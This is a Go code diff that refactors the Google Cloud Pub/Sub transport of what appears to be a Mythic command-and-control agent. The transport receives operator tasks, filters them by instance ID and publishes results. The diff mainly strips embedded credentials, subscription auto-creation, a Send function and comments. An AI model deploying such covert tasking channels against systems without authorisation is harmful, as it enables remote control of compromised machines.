@@ -2,7 +2,6 @@ package main
 
 import (
 	"context"
-	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"time"
@@ -11,91 +10,56 @@ import (
 	"google.golang.org/api/option"
 )
 
-// Transport handles real-world GCP Pub/Sub communication
-// Mythic Server (GCP) ←→ Agent (Laptop/PC)
 type Transport struct {
 	client     *pubsub.Client
 	sub        *pubsub.Subscription
 	topic      *pubsub.Topic
 	ctx        context.Context
 	cancel     context.CancelFunc
-	instanceID string // unique per-instance ID for routing (prevents same-UUID collision)
-	agentID    string // Mythic UUID (payloadID) for message body identification
+	instanceID string
+	agentID    string
 }
 
-// Config for connecting to GCP from laptop/PC
 type Config struct {
-	ProjectID       string `json:"project_id"`       // GCP project ID
-	TasksTopic      string `json:"tasks_topic"`      // Topic Mythic publishes to
-	ResultsTopic    string `json:"results_topic"`    // Topic Agent publishes to
-	SubscriptionID  string `json:"subscription_id"`  // Shared subscription for all agents
-	CredentialsFile string `json:"credentials_file"` // Path to service account JSON key
-	CredentialsJSON string `json:"credentials_json"` // OR embedded JSON string
+	ProjectID         string `json:"project_id"`
+	ResultsTopic      string `json:"results_topic"`
+	TasksSubscription string `json:"subscription_id"`
+	CredentialsFile   string `json:"credentials_file"`
 }
 
-// NewTransport creates a transport that connects to GCP from anywhere.
-// Uses a shared subscription - agent filters messages locally by instanceID.
 func NewTransport(cfg *Config, instanceID, agentID string) (*Transport, error) {
 	ctx, cancel := context.WithCancel(context.Background())
 
-	// Setup authentication for remote access
 	var opts []option.ClientOption
-	if cfg.CredentialsJSON != "" {
-		// Embedded credentials (portable, base64 encoded)
-		credsJSON, err := base64.StdEncoding.DecodeString(cfg.CredentialsJSON)
-		if err != nil {
-			cancel()
-			return nil, err
-		}
-		opts = append(opts, option.WithCredentialsJSON(credsJSON))
-	} else if cfg.CredentialsFile != "" {
-		// File-based credentials
+	if cfg.CredentialsFile != "" {
 		opts = append(opts, option.WithCredentialsFile(cfg.CredentialsFile))
 	}
-	// If neither set, falls back to GOOGLE_APPLICATION_CREDENTIALS env var
 
-	// Create client (connects to GCP over internet)
 	client, err := pubsub.NewClient(ctx, cfg.ProjectID, opts...)
 	if err != nil {
 		cancel()
 		return nil, err
 	}
 
-	// Use shared subscription for all agents (no per-agent subscription creation)
-	subName := cfg.SubscriptionID
-	if subName == "" {
-		subName = "mythic-tasks-sub" // Default shared subscription name
-	}
-
-	sub := client.Subscription(subName)
-	exists, err := sub.Exists(ctx)
+	tasksSubscription := client.Subscription(cfg.TasksSubscription)
+	exists, err := tasksSubscription.Exists(ctx)
 	if err != nil {
 		cancel()
 		client.Close()
-		return nil, fmt.Errorf("failed to check subscription %s: %w", subName, err)
+		return nil, fmt.Errorf("failed to check subscription %s: %w", cfg.TasksSubscription, err)
 	}
-//Not necessary if subscription is pre-created, also potentially dangerous to create on the fly
 	if !exists {
-		// Create shared subscription if it doesn't exist (no filter)
-		tasksTopic := client.Topic(cfg.TasksTopic)
-		sub, err = client.CreateSubscription(ctx, subName, pubsub.SubscriptionConfig{
-			Topic:       tasksTopic,
-			AckDeadline: 60 * time.Second,
-		})
-		if err != nil {
-			cancel()
-			client.Close()
-			return nil, fmt.Errorf("failed to create subscription %s: %w", subName, err)
-		}
+		cancel()
+		client.Close()
+		return nil, fmt.Errorf("subscription %s does not exist", cfg.TasksSubscription)
 	}
 
-	// Configure for efficient receiving
-	sub.ReceiveSettings.MaxOutstandingMessages = 1000
-	sub.ReceiveSettings.NumGoroutines = 10
+	tasksSubscription.ReceiveSettings = pubsub.ReceiveSettings{
+		MaxOutstandingMessages: 1000,
+		NumGoroutines:          10,
+	}
 
 	resultsTopic := client.Topic(cfg.ResultsTopic)
-
-	// Configure for efficient publishing
 	resultsTopic.PublishSettings = pubsub.PublishSettings{
 		DelayThreshold: 10 * time.Millisecond,
 		CountThreshold: 1,
@@ -104,7 +68,7 @@ func NewTransport(cfg *Config, instanceID, agentID string) (*Transport, error) {
 
 	return &Transport{
 		client:     client,
-		sub:        sub,
+		sub:        tasksSubscription,
 		topic:      resultsTopic,
 		ctx:        ctx,
 		cancel:     cancel,
@@ -113,14 +77,11 @@ func NewTransport(cfg *Config, instanceID, agentID string) (*Transport, error) {
 	}, nil
 }
 
-// Listen starts receiving tasks from Mythic server.
-// Filters messages locally - only processes messages with matching instanceID.
 func (t *Transport) Listen(handler func(task map[string]interface{}) map[string]interface{}) error {
 	return t.sub.Receive(t.ctx, func(ctx context.Context, msg *pubsub.Message) {
-		// Check if this message is for us (filter by instance_id attribute)
+		// Check if this message is for us
 		targetInstance := msg.Attributes["instance_id"]
 		if targetInstance != "" && targetInstance != t.instanceID {
-			// Not for us - ignore (Nack so another agent can get it)
 			msg.Nack()
 			return
 		}
@@ -132,7 +93,6 @@ func (t *Transport) Listen(handler func(task map[string]interface{}) map[string]
 			return
 		}
 
-		// Process task
 		result := handler(task)
 
 		// Send response if we have one
@@ -141,46 +101,10 @@ func (t *Transport) Listen(handler func(task map[string]interface{}) map[string]
 			t.topic.Publish(t.ctx, &pubsub.Message{Data: data})
 		}
 
-		// Acknowledge message
 		msg.Ack()
 	})
 }
 
-// Send publishes a message to Mythic server
-func (t *Transport) Send(data map[string]interface{}) error {
-	// Marshal the Merlin message to JSON
-	msgData, err := json.Marshal(data)
-	if err != nil {
-		return err
-	}
-
-	// Base64 encode the message
-	encodedMsg := base64.StdEncoding.EncodeToString(msgData)
-
-	// Wrap in MythicMessageWrapper format
-	// sender_id = instanceID so the C2 server can route responses to this specific instance
-	// client_id = agentID (Mythic UUID) so the C2 server knows which Mythic agent this is
-	wrapper := map[string]interface{}{
-		"message":   encodedMsg,
-		"sender_id": t.instanceID,
-		"client_id": t.agentID,
-		"to_server": true,
-	}
-
-	// Marshal the wrapper
-	wrapperData, err := json.Marshal(wrapper)
-	if err != nil {
-		return err
-	}
-
-	// Publish to Pub/Sub
-	result := t.topic.Publish(t.ctx, &pubsub.Message{Data: wrapperData})
-	_, err = result.Get(t.ctx)
-	return err
-}
-
-// SendRaw publishes a pre-built base64 string (full Mythic frame) without JSON-marshaling
-// or re-encoding the message body. Used for encrypted staging and encrypted comms.
 func (t *Transport) SendRaw(base64Message string) error {
 	wrapper := map[string]interface{}{
 		"message":   base64Message,
@@ -197,7 +121,6 @@ func (t *Transport) SendRaw(base64Message string) error {
 	return err
 }
 
-// Close cleanup
 func (t *Transport) Close() error {
 	t.cancel()
 	t.topic.Stop()
